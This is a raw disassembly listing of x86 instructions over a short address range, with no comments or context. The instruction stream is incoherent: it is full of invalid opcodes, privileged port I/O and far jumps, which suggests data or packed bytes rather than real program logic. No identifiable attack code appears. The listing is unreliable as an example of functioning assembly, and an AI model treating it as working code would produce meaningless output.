  415b6b:	mov    bh,al
  415b6d:	xchg   edx,eax
  415b6e:	repnz retf 
  415b70:	jnp    0x415b83
  415b72:	cmp    eax,0x22ad49ab
  415b77:	lea    eax,[edi+edx*8]
  415b7a:	sub    DWORD PTR [edx+eax*8],ebp
  415b7d:	enter  0xc2f4,0xf1
  415b81:	pusha  
  415b82:	ret    
  415b83:	and    DWORD PTR [edx],edx
  415b85:	loopne 0x415b43
  415b87:	ret    0x2045
  415b8a:	cdq    
  415b8b:	fisttp DWORD PTR [ebx]
  415b8d:	shl    BYTE PTR [ebp+0x6541f9d1],cl
  415b93:	in     al,0x22
  415b95:	push   eax
  415b96:	call   0x8c14e4ec
  415b9b:	add    al,0x73
  415b9d:	jno    0x415bfa
  415b9f:	push   ebx
  415ba0:	lahf   
  415ba1:	rcl    BYTE PTR [edx+edi*4],1
  415ba4:	xchg   ebx,eax
  415ba5:	lods   eax,DWORD PTR ds:[esi]
  415ba6:	and    eax,0x99188623
  415bab:	and    esp,DWORD PTR [ebx+0xc090062]
  415bb1:	mov    dl,0x64
  415bb3:	repnz das 
  415bb5:	(bad)  
  415bb6:	jae    0x415bf3
  415bb8:	cdq    
  415bb9:	push   ds
  415bba:	daa    
  415bbb:	jne    0x415c36
  415bbd:	jae    0x415b92
  415bbf:	pusha  
  415bc0:	jno    0x415be8
  415bc2:	jbe    0x415b95
  415bc4:	add    eax,0xcf437822
  415bc9:	popf   
  415bca:	push   ecx
  415bcb:	ds and al,0x20
  415bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bcf:	dec    ecx
  415bd0:	stos   BYTE PTR es:[edi],al
  415bd1:	jb     0x415b80
  415bd3:	mov    ds:0x40ee37f,al
  415bd8:	adc    bl,al
  415bda:	push   edi
  415bdb:	retf   0xa2a4
  415bde:	jp     0x415bce
  415be0:	aam    0x1d
  415be2:	mov    WORD PTR [ebp-0x17],ss
  415be5:	pop    DWORD PTR [ebx]
  415be7:	adc    bh,dh
  415be9:	aaa    
  415bea:	push   0x36
  415bec:	out    dx,al
  415bed:	xor    bl,BYTE PTR [ecx]
  415bef:	gs xchg esp,eax
  415bf1:	mov    edi,0xe13caa9e
  415bf6:	lea    ecx,[edi+edi*1+0x327d7d25]
  415bfd:	std    
  415bfe:	retf   0x6586
  415c01:	fisttp DWORD PTR [ebx]
  415c03:	sbb    BYTE PTR [edx+0x36e8659d],0xb2
  415c0a:	nop
  415c0b:	scas   eax,DWORD PTR es:[edi]
  415c0c:	icebp  
  415c0d:	out    0xf2,eax
  415c0f:	scas   al,BYTE PTR es:[edi]
  415c10:	jle    0x415b93
  415c12:	retf   
  415c13:	stos   BYTE PTR es:[edi],al
  415c14:	out    0xa2,al
  415c16:	stos   BYTE PTR es:[edi],al
  415c17:	jl     0x415c0e
  415c19:	add    al,0xe0
  415c1b:	mov    WORD PTR [eax+0xd],es
  415c1e:	jmp    0xddf6:0x1ec2542d
  415c25:	cwde   
  415c26:	mov    ebx,0x767edd0a
  415c2b:	jle    0x415ca9
  415c2d:	sub    al,0x5d
  415c2f:	out    0xf5,eax
  415c31:	jns    0x415caf
  415c33:	call   0x4e47:0xa36d56d7
  415c3a:	add    dh,BYTE PTR [ebx+0x47]
  415c3d:	cmc    
  415c3e:	test   eax,0x9508619b
  415c43:	push   ds
  415c44:	stos   DWORD PTR es:[edi],eax
  415c45:	pop    es
  415c46:	mov    eax,0x222f96dd
  415c4b:	dec    edx
  415c4c:	fst    QWORD PTR [ecx+0x65]
  415c4f:	dec    esi
  415c50:	(bad)  
  415c51:	aad    0xbf
  415c53:	test   eax,0xee169ef
  415c58:	imul   esi,DWORD PTR [ebx-0x424809f],0xffffff89
  415c5f:	addr16 or al,0x59
  415c62:	xchg   esi,eax
  415c63:	cdq    
  415c64:	and    al,BYTE PTR [eax+0x261f7fb]
  415c6a:	pop    esi
  415c6b:	push   ebp
  415c6c:	je     0x415c39
  415c6e:	or     ecx,edi
  415c70:	fcom   DWORD PTR [ebp-0x524cb1c]
  415c76:	js     0x415c4e
  415c78:	lahf   
  415c79:	jae    0x415cef
  415c7b:	pop    es
  415c7c:	pop    edx
  415c7d:	int3   
  415c7e:	pop    es
  415c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c80:	es das 
  415c82:	fxch   st(4)
  415c84:	xchg   BYTE PTR [edi],ch
  415c86:	es sub edx,edi
  415c89:	pop    ebp
  415c8a:	into   
  415c8b:	mov    esp,0xfdc24332
  415c90:	ficomp WORD PTR [edi+edi*4-0x31]
  415c94:	cmp    BYTE PTR ds:0x2a6f15bf,bh
  415c9a:	fisttp QWORD PTR [edx-0x1d17d629]
  415ca0:	test   eax,0x2cbf1d1b
  415ca5:	sub    esp,DWORD PTR [edx+0x4b]
  415ca8:	push   edx
  415ca9:	mov    ecx,0xd328aa85
  415cae:	test   BYTE PTR [ecx-0xd],cl
  415cb1:	cld    
  415cb2:	mov    DWORD PTR [esi-0x12],eax
  415cb5:	int    0x5f
  415cb7:	and    ch,BYTE PTR [edx]
  415cb9:	out    dx,al
  415cba:	addr16 push eax
  415cbc:	ror    DWORD PTR [eax],1
  415cbe:	out    dx,al
  415cbf:	mov    edi,0xc01794df
  415cc4:	fstp   DWORD PTR [eax+0x351d0ab8]
  415cca:	out    0x46,al
  415ccc:	jne    0x415cc4
  415cce:	sbb    esi,edx
  415cd0:	mov    esi,0xc8ef43db
  415cd5:	(bad)  
  415cd6:	out    0x97,al
  415cd8:	repz jge 0x415d3c
  415cdb:	add    eax,0xba45bc53
  415ce0:	mov    bl,0xde
  415ce2:	sub    al,0xe9
  415ce4:	ins    BYTE PTR es:[edi],dx
  415ce5:	and    cl,ah
  415ce7:	and    ch,BYTE PTR [ecx-0x429fba61]
  415ced:	addr16 stc 
  415cef:	adc    DWORD PTR [edi+0x46],ecx
  415cf2:	and    eax,0x867c87f3
  415cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf8:	retf   
  415cf9:	dec    di
  415cfb:	repnz sbb esp,DWORD PTR [eax-0x74d040bd]
  415d02:	out    dx,al
  415d03:	jbe    0x415c9f
  415d05:	ins    BYTE PTR es:[edi],dx
  415d06:	cwde   
  415d07:	fstp   TBYTE PTR [eax]
  415d09:	cmp    ah,BYTE PTR [edi]
  415d0b:	aaa    
  415d0c:	in     al,dx
  415d0d:	imul   edx,ebp,0x5db45353
  415d13:	adc    eax,0x261ff4ee
  415d18:	jno    0x415cc9
  415d1a:	and    ecx,ebx
  415d1c:	bound  ebx,QWORD PTR [esi+edi*8-0x5a5d70da]
  415d23:	mov    al,ds:0x369c0adb
  415d28:	ficom  DWORD PTR [esi]
  415d2a:	retf   
  415d2b:	scas   eax,DWORD PTR es:[edi]
  415d2c:	push   esi
  415d2d:	mov    bh,0x6c
  415d2f:	in     al,dx
  415d30:	xchg   dl,dl
  415d32:	sub    BYTE PTR [eax+0x67529003],cl
  415d38:	mov    dh,0xdd
  415d3a:	bound  ecx,QWORD PTR [edx-0x39]
  415d3d:	pop    ebx
  415d3e:	mov    eax,ds
  415d40:	xchg   ebx,eax
  415d41:	shr    dh,0xe8
  415d44:	lea    edi,[edi]
  415d46:	stos   DWORD PTR es:[edi],eax
  415d47:	leave  
  415d48:	(bad)  
  415d49:	fcmove st,st(5)
  415d4b:	ret    0x5b6f
  415d4e:	sub    eax,0x6610500d
  415d53:	addr16 mov ds:0x223a,eax
  415d57:	mov    dh,0xaa
  415d59:	mov    ds:0xaae3c7a7,al
  415d5e:	dec    edi
  415d5f:	xchg   edi,eax
  415d60:	fwait
  415d61:	mov    ebx,0x613ae38a
  415d66:	mov    ebx,DWORD PTR [edx-0x287f44b0]
  415d6c:	retf   
  415d6d:	xchg   ecx,eax
  415d6e:	mov    ds:0x41c21fa,eax
  415d73:	push   edi
  415d74:	push   0xffffff8a
  415d76:	outs   dx,BYTE PTR ds:[esi]
  415d77:	jne    0x415d14
  415d79:	pusha  
  415d7a:	inc    ebx
  415d7b:	stos   BYTE PTR es:[edi],al
  415d7c:	je     0x415dde
  415d7e:	and    esp,DWORD PTR [ebp+0x4f]
  415d81:	dec    ebx
  415d82:	and    edx,ebp
  415d84:	int    0xfd
  415d86:	cdq    
  415d87:	call   0x348c:0x1226dd8
  415d8e:	jno    0x415dff
  415d90:	fst    QWORD PTR [eax-0x47]
  415d93:	sahf   
  415d94:	and    eax,DWORD PTR ds:0x8a3df23
  415d9a:	aad    0xec
  415d9c:	xlat   BYTE PTR ds:[ebx]
  415d9d:	(bad)  
  415da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da2:	inc    edx
  415da3:	xchg   BYTE PTR [edx+esi*1+0x25ab1c72],bl
  415daa:	xor    edi,eax
  415dac:	mov    DWORD PTR [ebp+0x10],ecx
  415daf:	jmp    0x416339
  415db4:	inc    eax
  415db5:	mov    cl,BYTE PTR [ebx+edi*1+0x3c]
  415db9:	inc    ecx
  415dba:	inc    eax
  415dbb:	nop
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	shl    eax,0x74
  415dc0:	test   eax,0x26b4078f
  415dc5:	mov    bl,0xc
  415dc7:	push   ss
  415dc8:	cmp    eax,0x91161604
  415dcd:	repz mov ch,ah
  415dd0:	sub    dh,BYTE PTR [esi]
  415dd2:	stos   DWORD PTR es:[edi],eax
  415dd3:	jecxz  0x415df7
  415dd5:	xchg   DWORD PTR [eax-0x3085f6],edx
  415ddb:	sahf   
  415ddc:	clc    
  415ddd:	into   
  415dde:	push   ss
  415ddf:	retf   0x86c2
  415de2:	or     edx,DWORD PTR [ebp-0x1d]
  415de5:	mov    ds:0x10da42a4,eax
  415dea:	iret   
  415deb:	jb     0x415e38
  415ded:	popa   
  415dee:	pop    esp
  415def:	jno    0x415deb
  415df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415df2:	call   0x940fc517
  415df7:	fidivr WORD PTR [ecx+0x20631ebe]
  415dfd:	(bad)  
  415dfe:	out    dx,al
  415dff:	outs   dx,BYTE PTR ds:[esi]
  415e00:	jmp    0x415e4c
  415e02:	mov    cl,0xe0
  415e04:	fwait
  415e05:	rol    DWORD PTR [eax],1
  415e07:	pusha  
  415e08:	shr    DWORD PTR [ebp+0x55],0x57
  415e0c:	push   ebx
  415e0d:	outs   dx,BYTE PTR ds:[esi]
  415e0e:	sub    ebx,DWORD PTR [ebx-0x2c]
  415e11:	mov    ah,0x64
  415e13:	mov    bl,0x2f
  415e15:	inc    ecx
  415e16:	jo     0x415e8e
  415e18:	xlat   BYTE PTR gs:[ebx]
  415e1a:	lods   eax,DWORD PTR ds:[esi]
  415e1b:	dec    edx
  415e1c:	mov    BYTE PTR [ebp-0x40820a98],dh
  415e22:	scas   al,BYTE PTR es:[edi]
  415e23:	in     eax,0xfe
  415e25:	test   BYTE PTR [esi-0xc509483],bl
  415e2b:	and    ebx,DWORD PTR [edi]
  415e2d:	bound  ebp,QWORD PTR [ebp+0x72]
  415e30:	mov    edi,0xfe858c56
  415e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e36:	cmp    ecx,DWORD PTR [edx]
  415e38:	cmc    
  415e39:	imul   edx,DWORD PTR [edx+0x29],0x76
  415e3d:	pop    esp
  415e3e:	pop    esi
  415e3f:	scas   al,BYTE PTR es:[edi]
  415e40:	jb     0x415e5a
  415e42:	dec    esp
  415e43:	(bad)  
  415e44:	fcmovu st,st(5)
  415e46:	ja     0x415ec4
  415e48:	pop    esi
  415e49:	sub    al,0x9b
  415e4b:	clc    
  415e4c:	rcl    DWORD PTR [ecx+0x65],cl
  415e4f:	dec    eax
  415e50:	sub    esp,eax
  415e52:	ds cmp eax,0xa07aa156
  415e58:	mov    ebx,ebx
  415e5a:	nop
  415e5b:	ja     0x415ebd
  415e5d:	jne    0x415e0b
  415e5f:	cmp    DWORD PTR [edx-0x3b],edi
  415e62:	jecxz  0x415eb0
  415e64:	outs   dx,BYTE PTR ds:[esi]
  415e65:	inc    esp
  415e66:	cmp    al,0xa6
  415e68:	mov    esp,0xde1f432
  415e6d:	xchg   esp,eax
  415e6e:	jge    0x415ee6
  415e70:	add    edx,DWORD PTR [ebx+0x12]
  415e73:	(bad)  [edx]
  415e75:	hlt    
  415e76:	fwait
  415e77:	and    al,0x5e
  415e79:	xor    al,0x2c
  415e7b:	pop    es
  415e7c:	add    DWORD PTR ds:0x38746a59,esp
  415e82:	and    ebp,DWORD PTR [ebx-0x53031e6a]
  415e88:	icebp  
  415e89:	dec    esi
  415e8a:	retf   
  415e8b:	xchg   ecx,eax
  415e8c:	or     BYTE PTR [edi-0x70a0b925],ah
  415e92:	xchg   esi,eax
  415e93:	aam    0x57
  415e95:	pop    ebp
  415e96:	pop    edi
  415e97:	popa   
  415e98:	inc    ebx
  415e99:	and    al,0x64
  415e9b:	sbb    BYTE PTR [edi+0x1],dh
  415e9e:	mov    cs,ebx
  415ea0:	maskmovq mm1,(bad)
  415ea1:	test   DWORD PTR [ebp-0x66de0066],0x448cbd3a
  415eab:	or     eax,0xf1b5c827
  415eb0:	fwait
  415eb1:	cmp    DWORD PTR [ebx-0x40a6868a],ecx
  415eb7:	sti    
  415eb8:	and    DWORD PTR [ebx-0x3a],ebp
  415ebb:	sbb    ch,BYTE PTR [eax+ecx*4]
  415ebe:	stos   BYTE PTR es:[edi],al
  415ebf:	dec    edx
  415ec0:	add    al,0x96
  415ec2:	push   edi
  415ec3:	cmp    bh,BYTE PTR [ecx+eiz*4+0x19]
  415ec7:	fcom   DWORD PTR ss:[eax]
  415eca:	and    DWORD PTR [esi+0x77],0xffffffe0
  415ece:	or     al,0xa7
  415ed0:	mov    bh,0x58
  415ed2:	repz dec esp
  415ed4:	pop    edi
  415ed5:	cmp    eax,0x1ac20a1
  415eda:	cmp    BYTE PTR [ebp-0x5d6f4160],al
  415ee0:	inc    edx
  415ee1:	push   esi
  415ee2:	and    DWORD PTR [ebx-0x5cfc29c],0xffffffcb
  415ee9:	push   cs
  415eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eeb:	cmp    DWORD PTR [esi],ebx
  415eed:	scas   eax,DWORD PTR es:[edi]
  415eee:	ins    DWORD PTR es:[edi],dx
  415eef:	jmp    0x415e7c
  415ef1:	div    ebx
  415ef3:	inc    edi
  415ef4:	mov    ecx,0x6a5db15c
  415ef9:	push   eax
  415efa:	mov    ch,0x1c
  415efc:	jae    0x415e85
  415efe:	jge    0x415f62
  415f00:	je     0x415e88
  415f02:	retf   
  415f03:	repz gs pop ebx
  415f06:	mov    bl,0xe1
  415f08:	jnp    0x415f3f
  415f0a:	add    al,dh
  415f0c:	sbb    dl,bl
  415f0e:	adc    DWORD PTR [edx+0x5068da92],ebp
  415f14:	lea    esi,[edi-0x45db0f62]
  415f1a:	mov    edi,DWORD PTR [ecx-0x50]
  415f1d:	jns    0x415eaf
  415f1f:	jno    0x415ef1
  415f21:	out    dx,eax
  415f22:	adc    BYTE PTR [edx],dh
  415f24:	retf   0xc26e
  415f27:	push   esp
  415f28:	je     0x415f1a
  415f2a:	jge    0x415f37
  415f2c:	lea    eax,[edx+edi*2]
  415f2f:	add    eax,0xd6de973
  415f34:	and    al,cl
  415f36:	sub    eax,0x1bb3f631
  415f3b:	mov    bh,0x7
  415f3d:	out    0xde,eax
  415f3f:	sbb    BYTE PTR [edx],bl
  415f41:	sar    edi,1
  415f43:	or     bl,0x79
  415f46:	add    ebp,DWORD PTR [edx]
  415f48:	jmp    0x415f97
  415f4a:	mov    BYTE PTR [edx],dh
  415f4c:	or     eax,0xd8ec7a7f
  415f51:	std    
  415f52:	aad    0xb5
  415f54:	pop    ebx
  415f55:	test   al,0x5
  415f57:	dec    esi
  415f58:	push   eax
  415f59:	daa    
  415f5a:	push   ebp
  415f5b:	xchg   ebp,eax
  415f5c:	stos   DWORD PTR es:[edi],eax
  415f5d:	sub    cl,dh
  415f5f:	dec    eax
  415f60:	push   ebp
  415f61:	mov    ch,0xed
  415f63:	ds mov edi,0xa480362b
  415f69:	jo     0x415f3e
  415f6b:	loop   0x415f89
  415f6d:	and    dl,0x34
  415f70:	adc    edi,ebp
  415f72:	sub    eax,0xcfcc376a
  415f77:	push   ecx
  415f78:	hlt    
  415f79:	rcl    BYTE PTR [eax+0x0],0xe8
  415f7d:	aas    
  415f7e:	ss push eax
  415f80:	or     DWORD PTR [edi+ecx*4-0x22bf94a1],ecx
  415f87:	pop    ebp
  415f88:	jg     0x415f86
  415f8a:	fisttp WORD PTR [eax+0x3234601c]
  415f90:	nop
  415f91:	(bad)  
  415f92:	std    
  415f93:	sub    BYTE PTR [eax-0x24],0xef
  415f97:	scas   eax,DWORD PTR es:[edi]
  415f98:	xchg   esi,eax
  415f99:	ret    0x31bb
  415f9c:	cmp    al,0x3e
  415f9e:	push   eax
  415f9f:	inc    edi
  415fa0:	fsub   QWORD PTR [edx]
  415fa2:	scas   eax,DWORD PTR es:[edi]
  415fa3:	pop    edi
  415fa4:	cmp    eax,0x3802d665
  415fa9:	lea    ecx,[edx-0x6d]
  415fac:	(bad)  
  415fad:	dec    eax
  415fae:	cmp    eax,DWORD PTR [edi+edi*4+0x567a714b]
  415fb5:	ret    0xd78d
  415fb8:	mov    edi,0xb9edf526
  415fbd:	jp     0x415fbd
  415fbf:	cmp    eax,0xf968fb9e
  415fc4:	aas    
  415fc5:	xlat   BYTE PTR ds:[ebx]
  415fc6:	test   DWORD PTR [esi],ebx
  415fc8:	into   
  415fc9:	sar    DWORD PTR [edi+0x74],1
  415fcc:	lods   eax,DWORD PTR ds:[esi]
  415fcd:	lahf   
  415fce:	lds    eax,FWORD PTR [edi+0x2c]
  415fd1:	xor    bl,BYTE PTR [edx-0x2f6a6a06]
  415fd7:	out    dx,eax
  415fd8:	and    BYTE PTR [edx+0x77],dl
  415fdb:	outs   dx,BYTE PTR ds:[esi]
  415fdc:	hlt    
  415fdd:	mov    al,0x74
  415fdf:	inc    edx
  415fe0:	nop
  415fe1:	imul   esp,DWORD PTR [edi],0x74
  415fe4:	lods   eax,DWORD PTR ds:[esi]
  415fe5:	push   ds
  415fe6:	outs   dx,DWORD PTR ds:[esi]
  415fe7:	and    dl,BYTE PTR [edx+0x10]
  415fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415feb:	cmp    dh,BYTE PTR [ebx+0x6a]
  415fee:	ins    DWORD PTR es:[edi],dx
  415fef:	sub    dh,cl
  415ff1:	ficom  DWORD PTR [edi+0x34]
  415ff4:	push   eax
  415ff5:	jp     0x416043
  415ff7:	dec    ebp
  415ff8:	repz out 0xee,al
  415ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ffc:	retf   
  415ffd:	dec    esi
  415ffe:	adc    al,0x7
  416000:	add    ch,bh
  416002:	sahf   
  416003:	inc    esi
  416004:	adc    al,0x5
  416006:	mov    eax,0x53a2c608
  41600b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600c:	out    0x96,al
  41600e:	ins    BYTE PTR es:[edi],dx
  41600f:	jne    0x41604c
  416011:	mov    dh,0x1d
  416013:	dec    edx
  416014:	(bad)  
  416015:	loop   0x415fe8
  416017:	ins    BYTE PTR es:[edi],dx
  416018:	jbe    0x416064
  41601a:	inc    ebp
  41601b:	jo     0x416057
  41601d:	loope  0x41600c
  41601f:	mov    eax,ds:0xd4da4b71
  416024:	fcomp  QWORD PTR [edi+0xf14c942]
  41602a:	push   ds
  41602b:	das    
  41602c:	cmp    eax,DWORD PTR [ebx+0x6]
  41602f:	icebp  
  416030:	imul   edi,DWORD PTR [edx],0x58
  416033:	test   eax,0xeb5b757d
  416038:	mov    ebp,0xe9edaa6b
  41603d:	push   edi
  41603e:	sbb    DWORD PTR [ecx-0x36],esp
  416041:	and    cl,ch
  416043:	and    eax,0xabad8974
  416048:	lods   al,BYTE PTR ds:[esi]
  416049:	cmp    eax,0xa60a9b46
  41604e:	loopne 0x41606d
  416050:	jns    0x416023
  416052:	rol    DWORD PTR [ecx-0x27],1
  416055:	fucomp st(5)
  416057:	xor    DWORD PTR [eax-0x6f],ecx
  41605a:	fs das 
  41605c:	inc    edi
  41605d:	xchg   ecx,eax
  41605e:	ret    0x117a
  416061:	mov    esp,0x3e3ab44f
  416066:	add    dh,dl
  416068:	mov    ebx,0x5da0e01d
  41606d:	fsubr  QWORD PTR [ebp-0xf079fa2]
  416073:	clc    
  416074:	xor    ebp,DWORD PTR [ebp+eiz*2-0xd]
  416078:	push   edx
  416079:	fndisi(8087 only) 
  41607b:	inc    eax
  41607c:	(bad)  
  41607d:	(bad)  
  41607e:	arpl   WORD PTR [esi-0x19],bp
  416081:	xchg   BYTE PTR [edi-0x7ffd33c7],ah
  416087:	cmp    DWORD PTR [edx-0x2022bbb2],ebx
  41608d:	icebp  
  41608e:	xor    al,BYTE PTR [ebp-0x23]
  416091:	adc    esp,esi
  416093:	je     0x416065
  416095:	jne    0x4160f5
  416097:	lock push ss
  416099:	sub    dh,BYTE PTR [eax-0x65]
  41609c:	mov    ah,0x6a
  41609e:	gs dec ebx
  4160a0:	push   0x8859940c
  4160a5:	loopne 0x4160f7
  4160a7:	jmp    0xc3d0:0xf0d4cb51
  4160ae:	mov    ds:0x5c710ea8,al
  4160b3:	mov    ebx,0xfec83a68
  4160b8:	cmp    ebx,esp
  4160ba:	add    dl,BYTE PTR [ecx-0x5bda4b20]
  4160c0:	xchg   edi,eax
  4160c1:	sbb    BYTE PTR [eax+0x25],ah
  4160c4:	or     eax,0x660267fc
  4160c9:	in     eax,dx
  4160ca:	loope  0x41606a
  4160cc:	lods   al,BYTE PTR ds:[esi]
  4160cd:	xchg   ecx,eax
  4160ce:	adc    al,0x7a
  4160d0:	cli    
  4160d1:	fdiv   QWORD PTR [ebp-0x7f]
  4160d4:	mov    edx,0xacaaf91c
  4160d9:	mov    al,ds:0xee391697
  4160de:	cmp    eax,0x87ef991f
  4160e3:	adc    BYTE PTR [ebx-0x6f],ah
  4160e6:	repz imul ebp,DWORD PTR [ecx-0x18],0x7325dd77
  4160ee:	in     eax,dx
  4160ef:	add    dh,BYTE PTR cs:[ebx-0x54]
  4160f3:	adc    edi,eax
  4160f5:	xchg   edi,eax
  4160f6:	push   ebp
  4160f7:	dec    ebx
  4160f8:	sub    ch,cl
  4160fa:	fwait
  4160fb:	std    
  4160fc:	cs push 0x29cd48a3
  416102:	xchg   DWORD PTR [ebp+0x35],edi
  416105:	loopne 0x4160a2
  416107:	sbb    eax,0x73e6970e
  41610c:	clc    
  41610d:	sbb    al,0x44
  41610f:	add    ah,BYTE PTR [edx-0x72]
  416112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416113:	xor    al,BYTE PTR [eax+eax*1-0x44eed99e]
  41611a:	sub    dl,BYTE PTR [edi+0x42d7c318]
  416120:	test   DWORD PTR [ecx],0x3e0ce423
  416126:	(bad)  [ebp+0x5b]
  416129:	mov    al,0x99
  41612b:	pop    ebp
  41612c:	arpl   WORD PTR [esi*1-0x7dc766d5],ax
  416133:	pusha  
  416134:	test   BYTE PTR [ebx+edx*2-0x58],bh
  416138:	adc    eax,0xec14df9a
  41613d:	add    eax,edi
  41613f:	pop    ecx
  416140:	scas   eax,DWORD PTR es:[edi]
  416141:	jnp    0x4160f1
  416143:	push   esp
  416144:	jge    0x4161ac
  416146:	push   edi
  416147:	scas   eax,DWORD PTR es:[edi]
  416148:	xchg   ebx,eax
  416149:	iret   
  41614a:	mov    cl,0xb9
  41614c:	in     al,dx
  41614d:	lock loope 0x41619a
  416150:	push   cs
  416151:	and    DWORD PTR [ebx-0x20002cd1],0x317855af
  41615b:	or     DWORD PTR ds:0x6774bc24,ebp
  416161:	ret    0x9ad4
  416164:	es (bad) 
  416166:	data16 fld TBYTE PTR [edi+esi*8-0x7b0cc21e]
  41616e:	fisub  WORD PTR [edx+0x76]
  416171:	mov    WORD PTR [ebx+0x49],ds
  416174:	mov    bh,0xd7
  416176:	sub    BYTE PTR [esi+0x70],dh
  416179:	cld    
  41617a:	mov    bh,0xd2
  41617c:	out    dx,eax
  41617d:	sbb    DWORD PTR [edx-0x27],0xbd171c7d
  416184:	div    BYTE PTR [edx-0x61f96532]
  41618a:	sub    BYTE PTR [ebp+0x139e31af],dl
  416190:	mov    al,BYTE PTR [esi]
  416192:	adc    dl,dh
  416194:	adc    al,BYTE PTR [eax+ebp*4]
  416197:	sub    BYTE PTR [esi],ah
  416199:	adc    DWORD PTR [edx+0x5b],eax
  41619c:	pop    ss
  41619d:	cmc    
  41619e:	lods   eax,DWORD PTR ds:[esi]
  41619f:	add    dl,BYTE PTR [edx]
  4161a1:	xchg   BYTE PTR [ecx-0xefbc7c0],cl
  4161a7:	push   ecx
  4161a8:	sbb    eax,0x856bbc9a
  4161ad:	mov    ebx,0x75ceeebb
  4161b2:	or     DWORD PTR [eax-0x65],edx
  4161b5:	fwait
  4161b6:	addr16 cmp eax,0x78f22d34
  4161bc:	mov    ebp,cs
  4161be:	div    DWORD PTR [esi+0x4c]
  4161c1:	mov    al,0x5
  4161c4:	cmp    cl,BYTE PTR [edx-0x5a7a24c8]
  4161ca:	dec    edx
  4161cb:	pop    ebp
  4161cc:	add    BYTE PTR [edx],ah
  4161ce:	push   esp
  4161cf:	outs   dx,DWORD PTR ds:[esi]
  4161d0:	adc    DWORD PTR [ecx],esp
  4161d2:	mov    ds:0x9ba4b118,al
  4161d7:	cmc    
  4161d8:	and    ebp,DWORD PTR [edx+ebp*8]
  4161db:	xor    al,0xd5
  4161dd:	mov    bh,0x39
  4161df:	pop    ebp
  4161e0:	mov    cl,0x2f
  4161e2:	les    ebp,FWORD PTR [eax-0x738447f9]
  4161e8:	inc    edx
  4161e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ea:	jbe    0x41617d
  4161ec:	cmovs  eax,DWORD PTR [ecx]
  4161ef:	push   eax
  4161f0:	cmp    cl,BYTE PTR ds:0x81f9fc11
  4161f6:	jno    0x4161a1
  4161f8:	aaa    
  4161f9:	icebp  
  4161fa:	pop    esp
  4161fb:	sahf   
  4161fc:	push   cs
  4161fd:	outs   dx,BYTE PTR ds:[esi]
  4161fe:	xor    ecx,esi
  416200:	push   0xffffff8d
  416202:	fs jno 0x4161cc
  416205:	or     al,BYTE PTR [eax+0x6cc934de]
  41620b:	jb     0x416263
  41620d:	or     DWORD PTR [ebp-0x44],eax
  416210:	cmp    DWORD PTR [edi-0x1],eax
  416213:	add    al,0x1f
  416215:	bound  eax,QWORD PTR [edi-0x7d]
  416218:	mov    ecx,0xbcdad783
  41621d:	pop    ss
  41621e:	add    DWORD PTR [edi],edx
  416220:	pop    es
  416221:	push   edi
  416222:	imul   edx
  416224:	lahf   
  416225:	mov    ebx,0xa018f373
  41622a:	dec    edx
  41622b:	(bad)  
  41622c:	mul    BYTE PTR gs:[edx-0x50]
  416230:	popa   
  416231:	ret    0xf900
  416234:	xor    edi,DWORD PTR [ecx-0x773d5221]
  41623a:	out    dx,eax
  41623b:	outs   dx,DWORD PTR ds:[esi]
  41623c:	sbb    DWORD PTR [ebx+0x19],ebp
  41623f:	sbb    ebx,esi
  416241:	push   ecx
  416242:	js     0x41628e
  416244:	or     BYTE PTR [ecx-0x22143517],cl
  41624a:	repnz das 
  41624c:	mov    ds:0x20365b92,eax
  416251:	das    
  416252:	pop    edx
  416253:	inc    ebx
  416254:	cmp    ah,BYTE PTR [esi-0x2f7aabba]
  41625a:	dec    edi
  41625b:	imul   ebx,DWORD PTR [eax-0x6eb927b5],0xd8143d6e
  416265:	mov    bl,0xe0
  416267:	sbb    al,0xde
  416269:	xor    edi,DWORD PTR [ecx]
  41626b:	pop    edx
  41626c:	push   eax
  41626d:	inc    esp
  41626e:	inc    edi
  41626f:	mov    edx,0xcc6d7f5c
  416274:	dec    edi
  416275:	inc    esi
  416276:	repnz sbb al,0x73
  416279:	xchg   esi,eax
  41627a:	aad    0x57
  41627c:	add    DWORD PTR [ecx+0x2cdfd4fe],ebx
  416282:	sbb    DWORD PTR [ebp+0x2fc2cb6f],ebx
  416288:	adc    BYTE PTR [ebp-0x6b],bl
  41628b:	dec    ebp
  41628c:	add    bh,BYTE PTR [ebx+0x44]
  41628f:	mov    ds:0x99c0c03e,al
  416294:	adc    ecx,DWORD PTR [eax]
  416296:	jae    0x41622a
  416298:	mov    ebx,0xac6724d3
  41629d:	sbb    al,0xa9
  41629f:	cs mov eax,0x81dd1b18
  4162a5:	out    dx,eax
  4162a6:	les    edx,FWORD PTR [ebp+0x4384fb63]
  4162ac:	adc    edi,DWORD PTR [esi-0x43]
  4162af:	dec    ebp
  4162b0:	mov    cl,0x66
  4162b2:	mov    ah,0x4f
  4162b4:	rol    eax,0x96
  4162b7:	sub    eax,0x70a73d2
  4162bc:	push   ebx
  4162bd:	jecxz  0x4162ea
  4162bf:	xchg   BYTE PTR [eax+eiz*2],ah
  4162c2:	icebp  
  4162c3:	icebp  
  4162c4:	dec    edx
  4162c5:	pop    eax
  4162c6:	pop    ds
  4162c7:	ret    0x6e85
  4162ca:	fwait
  4162cb:	pop    eax
  4162cc:	add    ch,BYTE PTR [ecx-0x38f2951b]
  4162d2:	(bad)  
  4162d3:	mov    esp,esi
  4162d5:	popf   
  4162d6:	sbb    ch,BYTE PTR [ebx+0x76]
  4162d9:	cld    
  4162da:	jnp    0x41629e
  4162dc:	ret    0x37fb
  4162df:	stc    
  4162e0:	sub    BYTE PTR [esi+0x5c0d91b4],ch
  4162e6:	fcomp  QWORD PTR [esi+0x67]
  4162e9:	sbb    ebp,eax
  4162eb:	dec    ecx
  4162ec:	clc    
  4162ed:	push   ebp
  4162ee:	out    0x41,al
